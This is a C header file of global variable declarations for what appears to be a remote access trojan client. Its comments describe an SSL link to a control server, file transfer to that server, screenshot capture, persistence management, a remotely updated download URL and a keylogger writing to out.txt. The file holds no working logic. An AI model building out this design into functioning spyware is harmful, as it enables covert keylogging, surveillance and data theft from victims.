//Main connection variables
extern struct sockaddr_in ServerAddress;
extern int sock; //Main socket fd
extern char *ServerIP; //IP the Client will try to connect to
extern char *AutoServerIP; //Auto IP address
extern unsigned short ServerPort;

//OpenSSL variables - SSL_CTX *Context is in main() of Client.c
extern SSL *ssl;

//TransferFiles.h (TransferFilesToServer) variables
struct sockaddr_in FileServerAddress; //Used for the file transfer socket connection
unsigned short ServerTransferPort; //Port used to transfer files from the client to the server

//Used to get new names for each screenshot taken
extern char BaseFileName[5]; //Base name
extern char FullFileName[50]; //Will store the entire full name: BaseFileName + UnixTime + Extension
extern char Extension[5]; //Adds .bmp at the end of the filename.

//Persistence.h variables used to manage persistences (Add/remove)
unsigned short int PersistenceTechniques[3]; //Counter of which persistences were established
int RemovedPersistences; //Counter for how many established persistences were removed
unsigned short int KeysNotDeleted; //Counter of how many established persistences couldn't be removed

//Download.h
//IP/URL Variable to be updated and from which the client will download files. This will be updated through 'updateurl'
char Site[30]; //Updated URL for the function 'UpdateURLDownload'

//Keylogger.h keylogger variables
extern BOOL IsKeyLoggerOn; //Checks if the keylogger is currently disabled/enabled
extern HANDLE KeyLoggerThread; //Global handle for the start of the keylogger thread
extern BOOL IsShiftPressed; //Checks if Shift is pressed
extern FILE *fp; //File Pointer that will be opened to write characters logged in the out.txt file. This will be closed in the StopLogger function, and the thread will be killed after this
